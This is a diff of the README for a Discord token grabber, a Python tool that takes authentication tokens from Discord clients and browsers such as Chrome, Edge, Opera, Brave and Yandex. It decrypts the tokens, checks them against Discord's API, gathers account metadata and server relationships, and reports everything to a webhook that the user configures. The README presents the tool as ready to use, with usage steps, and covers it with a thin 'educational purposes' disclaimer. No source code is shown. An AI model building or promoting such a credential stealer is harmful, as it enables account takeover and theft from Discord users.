@@ -1,58 +1,52 @@
-# Discord Token Grabber
+# Discord Token Extractor
 
-This script extracts Discord tokens from different browsers and sends them to a specified Discord webhook URL. It is designed for educational purposes to demonstrate how web browsers store tokens and how one might retrieve them. **Please use this responsibly** and never use this script for malicious purposes.
+![rounded-image (1)](https://github.com/user-attachments/assets/482b8dcd-32b2-494e-93b3-2857cc6e9793)
 
 ## Features
 
-- Extracts Discord tokens from popular browsers and Discord clients.
-- Supports browsers: Chrome, Opera, Brave, Microsoft Edge, Yandex.
-- Supports Discord clients: Discord, Discord Canary, Discord PTB.
-- Decrypts encrypted tokens using the Windows Cryptography API (via AES decryption).
-- Validates tokens by sending a request to Discord's API.
-- Sends valid tokens to a specified Discord webhook.
+- Extracts tokens from popular browsers
+- Decrypts protected tokens
+- Validates tokens against Discord API
+- Collects account metadata
+- Analyzes user servers and relationships
+- Reports results via Discord Webhook
 
-## How It Works
+## Supported Browsers
 
-1. **Extract Tokens:**
-   The script scans local storage files from browsers and Discord clients for any stored authentication tokens.
-   
-2. **Decrypt Tokens:**
-   Encrypted tokens are decrypted using the `AES` encryption algorithm.
-
-3. **Validate Tokens:**
-   Extracted tokens are validated by making a request to Discord's API to ensure they are valid.
-
-4. **Send Tokens to Webhook:**
-   Valid tokens are then sent to a configured Discord webhook URL via a POST request.
+- Discord (Stable, Canary, PTB)
+- Chrome
+- Edge
+- Opera/Opera GX
+- Brave
+- Yandex
 
 ## Requirements
 
-- Python 3.x
-- Required libraries:
-  - `requests`
-  - `pycryptodome`
-  - `win32crypt`
-- Windows operating system (as the script uses Windows-specific APIs for token decryption)
+- Python 3.6+
+- requests
+- pycryptodome
+- pywin32 (Windows only)
 
-## Setup
+## Usage
 
-1. Clone the repository or download the script to your local machine.
+1. Set your webhook URL in `Grabber.py`
+2. Run the script:
 
-2. Install the required dependencies using `pip`:
+```python
+python main.py
+```
 
-    ```bash
-    pip install requests pycryptodome pypiwin32
-    ```
+## How It Works
 
-3. Set your **Discord webhook URL**:
+The extractor scans browser storage files for tokens using regex patterns, decrypts them when necessary, validates them against Discord's API, and collects account metadata for reporting.
 
-    - Open your Discord server settings, navigate to the *Webhooks* section, and create a new webhook.
-    - Copy the webhook URL and replace `"WEBHOOK URL"` in the script with your copied URL.
+## Disclaimer
 
-4. Run the script:
+This tool is for educational purposes only. Unauthorized use violates Discord's Terms of Service and may be illegal. Use only on your own accounts or with explicit permission.
 
-    ```bash
-    python Main.py
-    ```
+## Security Tips
 
-   The script will search for Discord tokens and send any valid ones to your specified webhook.
+- Enable 2FA on your Discord account
+- Regularly check active sessions
+- Use strong passwords
+- Be cautious with browser extensions
